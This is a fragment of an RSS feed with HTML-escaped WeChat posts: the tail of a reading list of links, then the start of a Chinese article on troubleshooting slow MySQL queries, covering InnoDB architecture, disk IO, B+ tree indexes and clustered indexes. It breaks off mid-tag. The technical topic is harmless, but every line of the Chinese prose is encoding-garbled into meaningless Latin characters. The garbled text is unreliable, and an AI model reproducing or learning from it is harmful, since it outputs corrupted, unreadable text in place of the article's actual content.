å¥½å‹ï¼Œè¿›ä¸€æ­¥äº¤æµã€‚&lt;/p&gt;&lt;/blockquote&gt;&lt;p&gt;&lt;strong&gt;æ¨èé˜…è¯»ï¼š&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;&lt;a target=&quot;_blank&quot; href=&quot;https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzA4MTc4NTUxNQ==&amp;amp;action=getalbum&amp;amp;album_id=1551616798431690754#wechat_redirect&quot; tab=&quot;innerlink&quot; data-linktype=&quot;2&quot;&gt;1. ç©è½¬Linux&lt;/a&gt;&lt;br/&gt;&lt;a target=&quot;_blank&quot; href=&quot;https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzA4MTc4NTUxNQ==&amp;amp;action=getalbum&amp;amp;album_id=1339444055490592770#wechat_redirect&quot; tab=&quot;innerlink&quot; data-linktype=&quot;2&quot;&gt;2. ä»€ä¹ˆå‘³é“ä¸“è¾‘&lt;/a&gt;&lt;/p&gt;&lt;p&gt;3.Â &lt;a target=&quot;_blank&quot; href=&quot;https://mp.weixin.qq.com/s?__biz=MzA4MTc4NTUxNQ==&amp;amp;mid=2650521059&amp;amp;idx=1&amp;amp;sn=d6742140c684f16cb4435508bdb5a418&amp;amp;scene=21#wechat_redirect&quot; tab=&quot;innerlink&quot; data-linktype=&quot;2&quot;&gt;è“ç‰™å¦‚æ¢¦&lt;/a&gt;&lt;br/&gt;4.Â &lt;a target=&quot;_blank&quot; href=&quot;http://mp.weixin.qq.com/s?__biz=MzA4MTc4NTUxNQ==&amp;amp;mid=2650520865&amp;amp;idx=1&amp;amp;sn=ff7a751a092000a9aec8e47df35ab25a&amp;amp;chksm=8780bae5b0f733f3bd75575ef9c14e548bd833bf2ba1289b6f77fd0bbcc5fbc264c19c8cb04a&amp;amp;scene=21#wechat_redirect&quot; data-itemshowtype=&quot;0&quot; tab=&quot;innerlink&quot; data-linktype=&quot;2&quot;&gt;æ€æœºï¼&lt;/a&gt;&lt;br/&gt;5.Â &lt;a target=&quot;_blank&quot; href=&quot;http://mp.weixin.qq.com/s?__biz=MzA4MTc4NTUxNQ==&amp;amp;mid=2650521932&amp;amp;idx=1&amp;amp;sn=2a171aaaeb1e6124c86f39a46075363c&amp;amp;chksm=8780c688b0f74f9e25baf3495883dfe50541068dc4e4c1ae8d45ead7daee208a94563af74312&amp;amp;scene=21#wechat_redirect&quot; data-itemshowtype=&quot;0&quot; tab=&quot;innerlink&quot; data-linktype=&quot;2&quot;&gt;å¤±è”çš„æ¶æ„å¸ˆï¼Œåªç•™ä¸‹ä¸€æ®µè„šæœ¬&lt;/a&gt;&lt;br/&gt;6.Â &lt;a target=&quot;_blank&quot; href=&quot;http://mp.weixin.qq.com/s?__biz=MzA4MTc4NTUxNQ==&amp;amp;mid=2650521617&amp;amp;idx=1&amp;amp;sn=86e4bee100fa78ccc94e24bb27f0e71a&amp;amp;chksm=8780c7d5b0f74ec36bd0a06167f5b84777ecb2d48b57f3d96e3ce3c4575e6b777dda0188376f&amp;amp;scene=21#wechat_redirect&quot; data-itemshowtype=&quot;0&quot; tab=&quot;innerlink&quot; data-linktype=&quot;2&quot;&gt;æ¶æ„å¸ˆå†™çš„BUGï¼Œéæ¯”å¯»å¸¸&lt;/a&gt;&lt;/p&gt;&lt;/section&gt;
                &lt;/div&gt;&lt;/div&gt;</content:encoded>
</item>
<item>
<guid>8194308a28dd00d3c6f7196bff27a2b8</guid>
<title>æ…¢ SQL æ’æŸ¥æ€è·¯ï¼Ÿå°±è¿™</title>
<link>https://toutiao.io/k/xitokgg</link>
<content:encoded>&lt;div&gt;&lt;div&gt;&lt;section data-tool=&quot;mdniceç¼–è¾‘å™¨&quot; data-website=&quot;https://www.mdnice.com&quot; data-mpa-powered-by=&quot;yiban.io&quot;&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;ä»Šå¤©å’Œå¤§å®¶èŠä¸€ä¸ªå¸¸è§çš„é—®é¢˜ï¼šæ…¢SQLã€‚&lt;/p&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;é€šè¿‡æœ¬æ–‡ä½ å°†äº†è§£åˆ°ä»¥ä¸‹å†…å®¹ï¼š&lt;/p&gt;&lt;ul data-tool=&quot;mdniceç¼–è¾‘å™¨&quot; class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;section&gt;æ…¢SQLçš„å±å®³&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;SQLè¯­å¥çš„æ‰§è¡Œè¿‡ç¨‹&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;å­˜å‚¨å¼•æ“å’Œç´¢å¼•çš„é‚£äº›äº‹å„¿&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;æ…¢SQLè§£å†³ä¹‹é“&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;åç»­å‡ä»¥MySQLé»˜è®¤å­˜å‚¨å¼•æ“InnoDBä¸ºä¾‹è¿›è¡Œå±•å¼€ï¼Œè¯ä¸å¤šè¯´ï¼Œå¼€æï¼&lt;/p&gt;&lt;h2 data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;span/&gt;&lt;span&gt;1.æ…¢SQLçš„å±å®³&lt;/span&gt;&lt;/h2&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;æ…¢SQLï¼Œå°±æ˜¯è·‘å¾—å¾ˆæ…¢çš„SQLè¯­å¥ï¼Œä½ å¯èƒ½ä¼šé—®æ…¢SQLä¼šæœ‰å•¥é—®é¢˜å—ï¼Ÿ&lt;/p&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;è¯•æƒ³ä¸€ä¸ªåœºæ™¯ï¼š&lt;/p&gt;&lt;blockquote data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;p&gt;å¤§ç™½å’Œå°é»‘ç«¯åˆå‡ºå»ç©ï¼Œæœºç¥¨å¤ªè´µäºæ˜¯ä¹°äº†é«˜é“ï¼Œç«è½¦ç«™çš„äººçœŸæ˜¯ä¹Œå¤®ä¹Œå¤®çš„ã€‚&lt;/p&gt;&lt;/blockquote&gt;&lt;blockquote data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;p&gt;é©¬ä¸Šæ£€ç¥¨äº†ï¼Œå¤§ç™½å’Œå°é»‘å‡†å¤‡å»å•æ‰€æ¸…ç†ä¸‹åº“å­˜ï¼Œå‘ä½ä¸å¤šï¼Œæ’é˜Ÿçš„äººè¿˜çœŸä¸å°‘ã€‚&lt;/p&gt;&lt;/blockquote&gt;&lt;blockquote data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;p&gt;å°é»‘å‘ç°å…¶ä¸­æœ‰3ä¸ªå‘çš„ä¹˜å®¢è´¼æ…¢ï¼Œå…¶ä»–2ä¸ªå‘ä½æ¢äº†å¥½å‡ æ³¢äººï¼Œè¿™3ä½å‘ä¸»å°±æ˜¯ä¸å‡ºæ¥ã€‚&lt;/p&gt;&lt;/blockquote&gt;&lt;blockquote data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;p&gt;ç­‰åœ¨å¤–é¢çš„å¤§ä¼™ï¼Œå¿ƒé‡Œå¾ˆæ˜¯ä¸çˆ½ï¼Œé•¿æœŸå ç”¨å…¬å…±èµ„æºï¼Œåé¢çš„äººæ²¡æ³•ç”¨ã€‚&lt;/p&gt;&lt;/blockquote&gt;&lt;blockquote data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;p&gt;å°é»‘è‹¦ç¬‘é“ï¼šè¿™ä¸å°±æ˜¯å•æ‰€ç‰ˆçš„æ…¢SQLå˜›ï¼&lt;/p&gt;&lt;/blockquote&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;è¿™æ˜¯å®é™…ç”Ÿæ´»ä¸­çš„ä¾‹å­ï¼Œæ¢åˆ°MySQLæœåŠ¡å™¨ä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œæ¯•ç«Ÿç§‘æŠ€æºè‡ªç”Ÿæ´»å˜›ã€‚&lt;/p&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;MySQLæœåŠ¡å™¨çš„èµ„æº(CPUã€IOã€å†…å­˜ç­‰)æ˜¯æœ‰é™çš„ï¼Œå°¤å…¶åœ¨é«˜å¹¶å‘åœºæ™¯ä¸‹éœ€è¦å¿«é€Ÿå¤„ç†æ‰è¯·æ±‚ï¼Œå¦åˆ™ä¸€æ—¦å‡ºç°æ…¢SQLå°±ä¼šé˜»å¡æ‰å¾ˆå¤šæ­£å¸¸çš„è¯·æ±‚ï¼Œé€ æˆå¤§é¢ç§¯çš„å¤±è´¥/è¶…æ—¶ç­‰ã€‚&lt;/p&gt;&lt;figure data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;img data-ratio=&quot;0.7542262678803641&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/wAkAIFs11qaMZss2ia9Bx0yJNIfuKRhiawKIx7Ap2Bfx9G5kxrH9wMxUOAGoJEthtictIjPvwyAUmk9vCQEJVicyxA/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1538&quot;/&gt;&lt;/figure&gt;&lt;h2 data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;span/&gt;&lt;span&gt;2.SQLè¯­å¥æ‰§è¡Œè¿‡ç¨‹&lt;/span&gt;&lt;/h2&gt;&lt;figure data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;img data-ratio=&quot;0.3701188455008489&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/wAkAIFs11qaMZss2ia9Bx0yJNIfuKRhiawvAsmfEicYvbEJicic3Zw3Ud8icpIqm5e8xVH5vAEkPUkzEkUbeQ0CUEpZQ/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1178&quot;/&gt;&lt;/figure&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;å®¢æˆ·ç«¯å’ŒMySQLæœåŠ¡ç«¯çš„äº¤äº’è¿‡ç¨‹ç®€ä»‹ï¼š&lt;/p&gt;&lt;ol data-tool=&quot;mdniceç¼–è¾‘å™¨&quot; class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;section&gt;å®¢æˆ·ç«¯å‘é€ä¸€æ¡SQLè¯­å¥ç»™æœåŠ¡ç«¯ï¼ŒæœåŠ¡ç«¯çš„è¿æ¥å™¨å…ˆè¿›è¡Œè´¦å·/å¯†ç ã€æƒé™ç­‰ç¯èŠ‚éªŒè¯ï¼Œæœ‰å¼‚å¸¸ç›´æ¥æ‹’ç»è¯·æ±‚ã€‚&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;æœåŠ¡ç«¯æŸ¥è¯¢ç¼“å­˜ï¼Œå¦‚æœSQLè¯­å¥å‘½ä¸­äº†ç¼“å­˜ï¼Œåˆ™è¿”å›ç¼“å­˜ä¸­çš„ç»“æœï¼Œå¦åˆ™ç»§ç»­å¤„ç†ã€‚&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;æœåŠ¡ç«¯å¯¹SQLè¯­å¥è¿›è¡Œè¯æ³•è§£æã€è¯­æ³•è§£æã€é¢„å¤„ç†æ¥æ£€æŸ¥SQLè¯­å¥çš„åˆæ³•æ€§ã€‚&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;æœåŠ¡ç«¯é€šè¿‡ä¼˜åŒ–å™¨å¯¹ä¹‹å‰ç”Ÿæˆçš„è§£ææ ‘è¿›è¡Œä¼˜åŒ–å¤„ç†ï¼Œç”Ÿæˆæœ€ä¼˜çš„ç‰©ç†æ‰§è¡Œè®¡åˆ’ã€‚&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;å°†ç”Ÿæˆçš„ç‰©ç†æ‰§è¡Œè®¡åˆ’è°ƒç”¨å­˜å‚¨å¼•æ“çš„ç›¸å…³æ¥å£ï¼Œè¿›è¡Œæ•°æ®æŸ¥è¯¢å’Œå¤„ç†ã€‚&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;å¤„ç†å®Œæˆåå°†ç»“æœè¿”å›å®¢æˆ·ç«¯ã€‚&lt;/section&gt;&lt;/li&gt;&lt;/ol&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;å®¢æˆ·ç«¯å’ŒMySQLæœåŠ¡ç«¯çš„äº¤äº’è¿‡ç¨‹ç®€å›¾ï¼š&lt;img data-ratio=&quot;1.138095238095238&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/wAkAIFs11qaMZss2ia9Bx0yJNIfuKRhiawCB9kKgFQd2GrOsuGfXszyoH4VZBEzSEOODJcyc0WUQ6a2kgR7k3Jkw/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1260&quot;/&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;ä¿—è¯è¯´&quot;æ¡æ¡å¤§è·¯é€šç½—é©¬&quot;ï¼Œä¼˜åŒ–å™¨çš„ä½œç”¨å°±æ˜¯æ‰¾åˆ°è¿™ä¹ˆå¤šè·¯ä¸­æœ€ä¼˜çš„é‚£ä¸€æ¡ã€‚&lt;/p&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;å­˜å‚¨å¼•æ“æ›´æ˜¯å†³å®šSQLæ‰§è¡Œçš„æ ¸å¿ƒç»„ä»¶ï¼Œé€‚å½“äº†è§£å…¶ä¸­åŸç†ååˆ†æœ‰ç›Šã€‚&lt;/p&gt;&lt;h2 data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;span/&gt;&lt;span&gt;3. å­˜å‚¨å¼•æ“å’Œç´¢å¼•çš„é‚£äº›äº‹å„¿&lt;/span&gt;&lt;/h2&gt;&lt;h3 data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;span/&gt;3.1 å­˜å‚¨å¼•æ“&lt;span/&gt;&lt;/h3&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;InnoDBå­˜å‚¨å¼•æ“(Storage Engine)æ˜¯MySQLé»˜è®¤ä¹‹é€‰ï¼Œæ‰€ä»¥éå¸¸å…¸å‹ã€‚&lt;/p&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;å­˜å‚¨å¼•æ“çš„ä¸»è¦ä½œç”¨æ˜¯è¿›è¡Œæ•°æ®çš„å­˜å–å’Œæ£€ç´¢ï¼Œä¹Ÿæ˜¯çœŸæ­£æ‰§è¡ŒSQLè¯­å¥çš„ç»„ä»¶ã€‚&lt;/p&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;InnoDBçš„æ•´ä½“æ¶æ„åˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ†ï¼šå†…å­˜æ¶æ„å’Œç£ç›˜æ¶æ„ï¼Œå¦‚å›¾ï¼š&lt;/p&gt;&lt;figure data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;img data-ratio=&quot;0.76875&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/wAkAIFs11qaMZss2ia9Bx0yJNIfuKRhiawfb1drqp3TbIRyP2cCf6mGMDkVq98oaVOXibG7mtT1u02K0NJrupBQAQ/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;640&quot;/&gt;&lt;/figure&gt;&lt;blockquote data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;p&gt;å­˜å‚¨å¼•æ“çš„å†…å®¹éå¸¸å¤šï¼Œå¹¶ä¸æ˜¯ä¸€ç¯‡æ–‡ç« èƒ½è¯´æ¸…æ¥šçš„ï¼Œæœ¬æ–‡ä¸è¿‡å¤šå±•å¼€ï¼Œæˆ‘ä»¬åœ¨æ­¤åªéœ€è¦äº†è§£å†…å­˜æ¶æ„å’Œç£ç›˜æ¶æ„çš„å¤§è‡´ç»„æˆå³å¯ã€‚&lt;/p&gt;&lt;/blockquote&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;InnoDB å¼•æ“æ˜¯é¢å‘è¡Œå­˜å‚¨çš„ï¼Œæ•°æ®éƒ½æ˜¯å­˜å‚¨åœ¨ç£ç›˜çš„æ•°æ®é¡µä¸­ï¼Œæ•°æ®é¡µé‡Œé¢æŒ‰ç…§å›ºå®šçš„è¡Œæ ¼å¼å­˜å‚¨ç€æ¯ä¸€è¡Œæ•°æ®ã€‚&lt;/p&gt;&lt;blockquote data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;p&gt;è¡Œæ ¼å¼ä¸»è¦åˆ†ä¸ºå››ç§ç±»å‹Compactã€Redundantã€Dynamicå’ŒCompressedï¼Œé»˜è®¤ä¸ºCompactæ ¼å¼ã€‚&lt;/p&gt;&lt;/blockquote&gt;&lt;figure data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;img data-ratio=&quot;0.3352941176470588&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/wAkAIFs11qaMZss2ia9Bx0yJNIfuKRhiawHM0bYBZibKpjUnIBh96avgob6ImMts8IUrUp4meU3kSvZgvQXKIS18A/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1360&quot;/&gt;&lt;/figure&gt;&lt;h4 data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;span/&gt;ç£ç›˜é¢„è¯»æœºåˆ¶å’Œå±€éƒ¨æ€§åŸç†&lt;span/&gt;&lt;/h4&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;å½“è®¡ç®—æœºè®¿é—®ä¸€ä¸ªæ•°æ®æ—¶ï¼Œä¸ä»…ä¼šåŠ è½½å½“å‰æ•°æ®æ‰€åœ¨çš„æ•°æ®é¡µï¼Œè¿˜ä¼šå°†å½“å‰æ•°æ®é¡µç›¸é‚»çš„æ•°æ®é¡µä¸€åŒåŠ è½½åˆ°å†…å­˜ï¼Œç£ç›˜é¢„è¯»çš„é•¿åº¦ä¸€èˆ¬ä¸ºé¡µçš„æ•´å€æ•°ï¼Œ&lt;span&gt;ä»è€Œæœ‰æ•ˆé™ä½ç£ç›˜IOçš„æ¬¡æ•°ã€‚&lt;/span&gt;&lt;/p&gt;&lt;figure data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;img data-ratio=&quot;0.5628834355828221&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/wAkAIFs11qaMZss2ia9Bx0yJNIfuKRhiawzADXHbHgXLrRvzTo6riacibYCuc6j9iaJVD8UAanYz8SzqUcqD0IS93cA/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1304&quot;/&gt;&lt;/figure&gt;&lt;h4 data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;span/&gt;ç£ç›˜å’Œå†…å­˜çš„äº¤äº’&lt;span/&gt;&lt;/h4&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;MySQLä¸­ç£ç›˜çš„æ•°æ®éœ€è¦è¢«äº¤æ¢åˆ°å†…å­˜ï¼Œæ‰èƒ½å®Œæˆä¸€æ¬¡SQLäº¤äº’ï¼Œå¤§è‡´å¦‚å›¾ï¼š&lt;/p&gt;&lt;figure data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;img data-ratio=&quot;0.5955414012738853&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/wAkAIFs11qaMZss2ia9Bx0yJNIfuKRhiawuuDwcNhjLLYYNrica4icc1Hs92j2gLSUsdVFIn4Pia6XkGq2lPop6wHmw/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1256&quot;/&gt;&lt;/figure&gt;&lt;ul data-tool=&quot;mdniceç¼–è¾‘å™¨&quot; class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;section&gt;æ‰‡åŒºæ˜¯ç¡¬ç›˜çš„è¯»å†™çš„åŸºæœ¬å•ä½ï¼Œé€šå¸¸æƒ…å†µä¸‹æ¯ä¸ªæ‰‡åŒºçš„å¤§å°æ˜¯ 512B&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;ç£ç›˜å—æ–‡ä»¶ç³»ç»Ÿè¯»å†™æ•°æ®çš„æœ€å°å•ä½ï¼Œç›¸é‚»çš„æ‰‡åŒºç»„åˆåœ¨ä¸€èµ·å½¢æˆä¸€ä¸ªå—ï¼Œä¸€èˆ¬æ˜¯4KB&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;é¡µæ˜¯å†…å­˜çš„æœ€å°å­˜å‚¨å•ä½ï¼Œé¡µçš„å¤§å°é€šå¸¸ä¸ºç£ç›˜å—å¤§å°çš„ 2^n å€&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;InnoDBé¡µé¢çš„é»˜è®¤å¤§å°æ˜¯16KBï¼Œæ˜¯æ•°å€ä¸ªæ“ä½œç³»ç»Ÿçš„é¡µ&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;figure data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;img data-ratio=&quot;0.5098039215686274&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/wAkAIFs11qaMZss2ia9Bx0yJNIfuKRhiawQcR5UBxgWJluY8rDsG1UbnabFia04265Pns6AicQticic2WIXJahNE0t0A/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;918&quot;/&gt;&lt;/figure&gt;&lt;h4 data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;span/&gt;éšæœºç£ç›˜IO&lt;span/&gt;&lt;/h4&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;MySQLçš„æ•°æ®æ˜¯ä¸€è¡Œè¡Œå­˜å‚¨åœ¨ç£ç›˜ä¸Šçš„ï¼Œå¹¶ä¸”è¿™äº›æ•°æ®å¹¶éç‰©ç†è¿ç»­åœ°å­˜å‚¨ï¼Œè¿™æ ·çš„è¯è¦æŸ¥æ‰¾æ•°æ®å°±æ— æ³•é¿å…éšæœºåœ¨ç£ç›˜ä¸Šè¯»å–å’Œå†™å…¥æ•°æ®ã€‚&lt;/p&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;å¯¹äºMySQLæ¥è¯´ï¼Œå½“å‡ºç°å¤§é‡ç£ç›˜éšæœºIOæ—¶ï¼Œå¤§éƒ¨åˆ†æ—¶é—´éƒ½è¢«æµªè´¹åˆ°å¯»é“ä¸Šï¼Œç£ç›˜å‘¼å™œå‘¼å™œè½¬ï¼Œå°±æ˜¯ä¼ è¾“ä¸äº†å¤šå°‘æ•°æ®ã€‚&lt;/p&gt;&lt;blockquote data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;p&gt;ä¸€æ¬¡ç£ç›˜è®¿é—®ç”±ä¸‰ä¸ªåŠ¨ä½œç»„æˆï¼š&lt;/p&gt;&lt;ul class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;section&gt;å¯»é“ï¼šç£å¤´ç§»åŠ¨å®šä½åˆ°æŒ‡å®šç£é“&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;æ—‹è½¬ï¼šç­‰å¾…æŒ‡å®šæ‰‡åŒºä»ç£å¤´ä¸‹æ—‹è½¬ç»è¿‡&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;æ•°æ®ä¼ è¾“ï¼šæ•°æ®åœ¨ç£ç›˜ä¸å†…å­˜ä¹‹é—´çš„å®é™…ä¼ è¾“&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/blockquote&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;å¯¹äºå­˜å‚¨å¼•æ“æ¥è¯´ï¼Œå¦‚ä½•æœ‰æ•ˆé™ä½éšæœºIOæ˜¯ä¸ªéå¸¸é‡è¦çš„é—®é¢˜ã€‚&lt;/p&gt;&lt;h3 data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;span/&gt;3.2 ç´¢å¼•&lt;span/&gt;&lt;/h3&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;å¯ä»¥å®ç°å¢åˆ æ”¹æŸ¥çš„æ•°æ®ç»“æ„éå¸¸å¤šï¼ŒåŒ…æ‹¬ï¼šå“ˆå¸Œè¡¨ã€äºŒå‰æœç´¢æ ‘ã€AVLã€çº¢é»‘æ ‘ã€Bæ ‘ã€B+æ ‘ç­‰ï¼Œè¿™äº›éƒ½æ˜¯å¯ä»¥ä½œä¸ºç´¢å¼•çš„å€™é€‰æ•°æ®ç»“æ„ã€‚&lt;/p&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;ç»“åˆMySQLçš„å®é™…æƒ…å†µï¼šç£ç›˜å’Œå†…å­˜äº¤äº’ã€éšæœºç£ç›˜IOã€æ’åºå’ŒèŒƒå›´æŸ¥æ‰¾ã€å¢åˆ æ”¹çš„å¤æ‚åº¦ç­‰ç­‰ï¼Œç»¼åˆè€ƒé‡ä¹‹ä¸‹B+æ ‘è„±é¢–è€Œå‡ºã€‚&lt;/p&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;B+æ ‘ä½œä¸ºå¤šå‰å¹³è¡¡æ ‘ï¼Œå¯¹äºèŒƒå›´æŸ¥æ‰¾å’Œæ’åºéƒ½å¯ä»¥å¾ˆå¥½åœ°æ”¯æŒï¼Œå¹¶ä¸”æ›´åŠ çŸ®èƒ–ï¼Œè®¿é—®æ•°æ®æ—¶çš„å¹³å‡ç£ç›˜IOæ¬¡æ•°å–å†³äºæ ‘çš„é«˜åº¦ï¼Œå› æ­¤B+æ ‘å¯ä»¥è®©ç£ç›˜çš„æŸ¥æ‰¾æ¬¡æ•°æ›´å°‘ã€‚&lt;/p&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;åœ¨InnoDBä¸­B+æ ‘çš„é«˜åº¦ä¸€èˆ¬éƒ½åœ¨2~4å±‚ï¼Œå¹¶ä¸”æ ¹èŠ‚ç‚¹å¸¸é©»å†…å­˜ä¸­ï¼Œä¹Ÿå°±æ˜¯è¯´æŸ¥æ‰¾æŸå€¼çš„è¡Œè®°å½•æ—¶æœ€å¤šåªéœ€è¦1~3æ¬¡ç£ç›˜I/Oæ“ä½œã€‚&lt;/p&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;MyISAMæ˜¯å°†æ•°æ®å’Œç´¢å¼•åˆ†å¼€å­˜å‚¨çš„ï¼ŒInnoDBå­˜å‚¨å¼•æ“çš„æ•°æ®å’Œç´¢å¼•æ²¡æœ‰åˆ†å¼€å­˜å‚¨ï¼Œè¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆæœ‰äººè¯´Innodbç´¢å¼•å³æ•°æ®ï¼Œæ•°æ®å³ç´¢å¼•ï¼Œå¦‚å›¾ï¼š&lt;/p&gt;&lt;figure data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;img data-ratio=&quot;0.4496951219512195&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/wAkAIFs11qaMZss2ia9Bx0yJNIfuKRhiawXEfGDDbZyicTohgDN9B9QEOOW2VcHRltqJyshFNkPFxgC1via6ksic6JQ/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1312&quot;/&gt;&lt;/figure&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;è¯´åˆ°InnoDBçš„æ•°æ®å’Œç´¢å¼•çš„å­˜å‚¨ï¼Œå°±æåˆ°ä¸€ä¸ªåè¯ï¼š&lt;strong&gt;èšé›†ç´¢å¼•&lt;/strong&gt;ã€‚&lt;/p&gt;&lt;h4 data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;span/&gt;èšé›†ç´¢å¼•&lt;span/&gt;&lt;/h4&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;èšé›†ç´¢å¼•å°†ç´¢å¼•å’Œæ•°æ®å®Œç¾åœ°èåˆåœ¨ä¸€èµ·ï¼Œæ˜¯æ¯ä¸ªInnodbè¡¨éƒ½ä¼šæœ‰çš„ä¸€ä¸ªç‰¹æ®Šç´¢å¼•ï¼Œä¸€èˆ¬æ¥è¯´æ˜¯å€ŸåŠ©äºè¡¨çš„ä¸»é”®æ¥æ„å»ºçš„B+æ ‘ã€‚&lt;/p&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;å‡è®¾æˆ‘ä»¬æœ‰studentè¡¨ï¼Œå°†idä½œä¸ºä¸»é”®ç´¢å¼•ï¼Œé‚£ä¹ˆèšé›†ç´¢å¼•çš„B+æ ‘ç»“æ„ï¼Œå¦‚å›¾ï¼š&lt;/p&gt;&lt;figure data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;img 